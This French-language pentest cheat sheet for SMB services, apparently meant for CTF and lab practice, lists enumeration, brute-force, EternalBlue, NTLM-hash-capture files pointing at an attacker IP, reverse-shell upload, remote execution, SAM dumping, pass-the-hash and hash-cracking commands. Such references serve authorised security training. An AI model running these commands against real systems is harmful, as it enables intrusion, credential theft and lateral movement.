# SMB/CIFS (139,445/TCP)

Server Message Block (SMB) permet le partage de fichiers, d'imprimantes et de communications entre nœuds sur un réseau.

## 🔍 Énumération
### Scan de base
```bash
# Scan Nmap détaillé
sudo nmap -sV -sC -p 139,445 $IP

# Scripts Nmap spécifiques à SMB
nmap --script=smb-* -p 139,445 $IP
```
### Énumération des partages
```bash
# Avec smbclient
smbclient -N -L //$IP/

# Avec smbmap (montre les permissions)
smbmap -H $IP
smbmap -H $IP -u 'guest' -p ''

# Avec netexec (crackmapexec)
nxc smb $IP -u '' -p '' --shares
```
### Énumération approfondie
```bash
# Enum4linux - outil tout-en-un
enum4linux -a $IP

# Énumération récursive des partages
smbmap -H $IP -R [Nom_Partage]

# Recherche de fichiers spécifiques
smbmap -H $IP -R [Nom_Partage] -A .xml -q
```
## 🔨 Exploitation
### Connexion aux partages
```bash
# Connexion anonyme
smbclient -N //$IP/[Nom_Partage]

# Connexion avec identifiants
smbclient //$IP/[Nom_Partage] -U "username%password"

# Montage du partage localement
mount -t cifs //$IP/[Nom_Partage] /mnt/smb -o username=user,password=pass
```
### Attaque par force brute
```bash
# Avec Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP smb

# Avec Netexec
nxc smb $IP -u users.txt -p passwords.txt
```
### Exploitation des vulnérabilités
```bash
# Test EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 $IP

# Exploitation avec Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $IP
set LHOST [VOTRE_IP]
run
```
### Capture de hachages NTLM
```bash
# Créer un fichier URL malveillant
cat > shell.url << EOF
[InternetShortcut]  
URL=Random_nonsense  
WorkingDirectory=Flibertygibbit  
IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon  
IconIndex=1
EOF

# Démarrer Responder
sudo responder -I tun0 -wv

# Uploader le fichier sur un partage SMB accessible
smbclient //$IP/[Nom_Partage] -U "username%password" -c "put shell.url"
```
## 🔐 Post-exploitation
### Transfert de fichiers
```bash
# Télécharger un fichier
smbclient //$IP/[Nom_Partage] -U "username%password" -c "get secret.txt"

# Uploader un fichier
smbclient //$IP/[Nom_Partage] -U "username%password" -c "put shell.php"

# Uploader un reverse shell
nxc smb $IP -u 'username' -p 'password' --put-file /path/to/nc.exe /tmp/nc.exe
```
### Exécution de commandes à distance
```bash
# Avec PsExec
impacket-psexec username:password@$IP

# Avec WMIExec
impacket-wmiexec username:password@$IP

# Avec Netexec
nxc smb $IP -u 'username' -p 'password' -x "whoami /all"
```
### Extraction de secrets
```bash
# Dumping SAM database
impacket-secretsdump username:password@$IP

# Pass-the-Hash
nxc smb $IP -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:a11736b048e1323bb41284e6e8919e53' -x "whoami"
```

## ⚠️ Erreurs courantes & astuces
- Les partages IPC$ et ADMIN$ peuvent nécessiter des privilèges élevés
- Le trafic SMB non chiffré peut être intercepté sur le réseau
- Certaines vulnérabilités SMB peuvent crasher des systèmes instables
- Les utilisateurs désactivés peuvent parfois toujours s'authentifier via SMB
- Si SMB échoue, essayez CIFS ou les ports alternatifs

### Astuces SMB tirées de CTFs réels
### Capture de hachages NTLM via SMB (Vault)
Forcer la capture de hachages NTLM en créant un partage SMB attractif:
- Si vous avez un accès en écriture à un partage SMB, vous pouvez créer un fichier SCF malveillant:

```bash
[Shell]
Command=2
IconFile=\\<votre_IP>\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```
Démarrer Responder pour capturer les hachages:
```bash
sudo responder -I tun0 -v
```

3. Lorsqu'un utilisateur accède au dossier contenant le fichier SCF, son système tentera de charger l'icône depuis votre serveur SMB, envoyant ainsi ses identifiants NTLM.
4. Cracker le hachage NTLM capturé:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```